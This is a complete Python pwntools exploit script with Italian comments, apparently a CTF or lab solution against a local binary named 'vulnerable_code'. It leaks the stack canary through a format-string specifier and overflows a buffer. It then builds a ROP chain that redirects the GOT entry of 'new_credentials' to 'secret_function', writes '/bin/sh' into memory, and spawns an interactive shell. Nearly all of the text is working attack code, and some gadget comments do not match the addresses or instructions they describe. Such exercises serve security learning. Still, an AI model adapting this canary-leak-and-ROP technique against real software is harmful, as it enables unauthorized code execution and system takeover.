from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

binsh = "/bin/sh\x00"

# *--------------------- Gadgets ---------------------*

where_to_write = int(hex(0x0000404058),0) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
pop_r12_r13 = int(hex(0x000040138c),0) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = int(hex(0x000040138e),0) # pop r13; pop r14; pop r15; ret;
mov_rax_r13 = int(hex(0x00004011d8),0) # mov rax, r13; ret;
mov_mmr13_r12 = int(hex(0x000040116a),0) # mov qword ptr [r13], r12; ret;
pop_rdi = int(hex(0x0000401393),0) # pop rdi; ret;
pop_rbp = int(hex(0x00004011fd),0) # pop rsi; pop r15; ret
add_mmrax_rbp = int(hex(0x0000401198),0) # add qword ptr [rax], rbp; ret;
xor_rdx = int(hex(0x0000401208),0) # xor edx, edx; ret;
pop_rsi = int(hex(0x0000401391),0) # pop rsi; pop r15; ret;

# *------------------- Useful func -------------------*

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def send_payload(list) : 
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./vulnerable_code',"./lib.so") # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(7)
p.sendline("0")
p.recvlines(2) # inserisci username 

# *--------------  return adress leak  ---------------*
ui.pause()
payload =[
    (0,b"%11$p")
    ] 
send_payload(payload)

p.recvlines(2)
canary = int(p.recvline(False).decode('utf-8'),16) # indrizzo dove risiede ret aggiungendo l'offset visto con gdb
log.info(f"Trovato il seguente canary : {hex(canary)}")

# *---- sovrascrittura pointer per puntare a ret  ----*
ui.pause()
payload =[
    (0,b"\x00"*34),
    (34,canary)
    ] 
send_payload(payload)

p.recvlines(2)

# *------  calcolo offset between two lib func -------*

secretfunc_offset = libc.symbols["secret_function"] - libc.symbols["new_credentials"]

# *----  ROP CHAIN -> scrittura in return adress  ----*
ui.pause()
rop = ROP(elf)
rop.raw(pop_r13) # pop r13; pop r14; pop r15; ret;
rop.raw(elf.got["new_credentials"]) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(mov_rax_r13) # mov [r13], r12; ret;
rop.raw(pop_rbp) # pop rbp; ret;
rop.raw(secretfunc_offset) # rbp = offset secret_function - change_username
rop.raw(add_mmrax_rbp) # add [rax], rbp; add offset to got entry
rop.raw(pop_r12_r13) # pop r12; pop r13; pop r14; pop r15; ret;
rop.raw(binsh) # r12 = "/bin/sh\x00"
rop.raw(where_to_write) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(mov_mmr13_r12) # mov [r13], r12; ret;
rop.raw(xor_rdx) # rdx = 0x0000000000000000
rop.raw(pop_rsi) # pop rsi; pop r15; ret;
rop.raw(p64(0x00)) # rsi = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(pop_rdi) # pop rdi; ret;
rop.raw(where_to_write) # rdi = .data idx -> "/bin/sh\x00"
rop.raw(elf.plt["new_credentials"]) # richiamiamo la funzione change_username ora che la sua entry nella got table Ã¨ stata modificata

payload =[
    (0,rop.chain())
    ]

send_payload(payload)

p.recvlines(3)
p.interactive()

# *------------------      END      ------------------*